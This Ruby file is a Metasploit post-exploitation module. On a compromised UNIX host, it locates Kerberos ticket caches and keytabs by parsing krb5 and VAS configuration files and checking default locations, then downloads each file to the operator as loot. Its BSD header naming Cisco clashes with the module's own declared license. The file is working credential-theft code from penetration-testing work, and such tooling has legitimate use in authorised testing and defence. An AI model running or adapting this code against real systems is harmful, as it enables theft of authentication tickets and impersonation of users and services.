# Copyright (c) 2015-2018, Cisco International Ltd
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#     * Redistributions of source code must retain the above copyright
#       notice, this list of conditions and the following disclaimer.
#     * Redistributions in binary form must reproduce the above copyright
#       notice, this list of conditions and the following disclaimer in the
#       documentation and/or other materials provided with the distribution.
#     * Neither the name of the Cisco International Ltd nor the
#       names of its contributors may be used to endorse or promote products
#       derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL CISCO INTERNATIONAL LTD BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'shellwords'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Common

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'UNIX Gather Kerberos Tickets',
        'Description' => %q{ Post Module to obtain all kerberos tickets on the targeted UNIX machine. },
        'License' => MSF_LICENSE,
        'Author' => [ 'Tim Brown <timb[at]nth-dimension.org.uk>'],
        'Platform' => %w[linux osx unix solaris aix],
        'SessionTypes' => [ 'meterpreter', 'shell' ]
      )
    )
    register_options([
      OptString.new('KRB_CONFIG_FILE', [true, 'The Kerberos config file.', '/etc/krb5.conf']),
      OptString.new('VAS_CONFIG_FILE', [true, 'The VASD config file.', '/etc/opt/quest/vas/vas.conf']),
    ])
  end

  def run
    print_status('Finding files')
    files = [ '/etc/opt/quest/vas/host.keytab' ]
    configs = [datastore['KRB_CONFIG_FILE'], datastore['VAS_CONFIG_FILE']]
    configs.each do |config_file|
      if file? config_file
        config = read_file(config_file)
        if /\n\s*default_ccache_name\s*=\s*(?<cache_location>.*?)\s*\n/ =~ config || /\n\s*default_cc_name\s*=\s*(?<cache_location>.*?)\s*\n/ =~ config
          if /^FILE:(?<file_pattern>.*%\{uid\}.*)/ =~ cache_location
            suffix = ''
          elsif /^DIR:(?<file_pattern>.*%\{uid\}.*)/ =~ cache_location
            suffix = '/*'
          elsif /^(?<storage>KEYRING|API|KCM|MEMORY|KSLSA):/ =~ cache_location
            print_error("Kerberos ticket cache uses #{storage}. This module does not support this storage type.")
          else
            print_error("Unknown storage type: #{cache_location}")
          end

          if file_pattern
            print_status("Kerberos tickets configured to be stored at #{file_pattern}")
            placeholder = 'MSF_INSERT_HERE'
            # The krb5 pattern uses %{uid} as a wildcard. This is misinterpreted by Rubocop as a format string token
            # rubocop: disable Style/FormatStringToken
            file_pattern['%{uid}'] = placeholder
            # rubocop: enable Style/FormatStringToken
            # Need to do this two-step thing so Shellwords.escape doesn't escape the asterisk
            file_pattern = Shellwords.escape(file_pattern)
            file_pattern[placeholder] = '*'
            files += cmd_exec("ls #{file_pattern}#{suffix}").split(/\r\n|\r|\n/)
          end
        end
      else
        vprint_warning("Could not find #{config_file}")
      end
    end
    files += cmd_exec('ls /var/lib/sss/db/ccache_*').split(/\r\n|\r|\n/)
    # Even though our config check should preclude this, it is a default location, so checking it may find something
    files += cmd_exec('ls /tmp/krb5*').split(/\r\n|\r|\n/)
    files = files.uniq
    files = files.select { |d| file?(d) }
    if files.nil? || files.empty?
      print_error('No kerberos tickets found')
      return
    end
    download_loot(files)
  end

  def download_loot(files)
    print_status("Looting #{files.count} files")
    files.each do |file|
      file.chomp!
      sep = '/'
      print_status("Downloading #{file}")
      data = read_file(file)
      file = file.split(sep).last
      loot_file = store_loot('unix_kerberos_tickets', 'application/octet-stream', session, data, "unix_kerberos_tickets_#{file}", 'Kerberos Tickets File')
      print_good("File stored in: #{loot_file}")
    end
  end
end
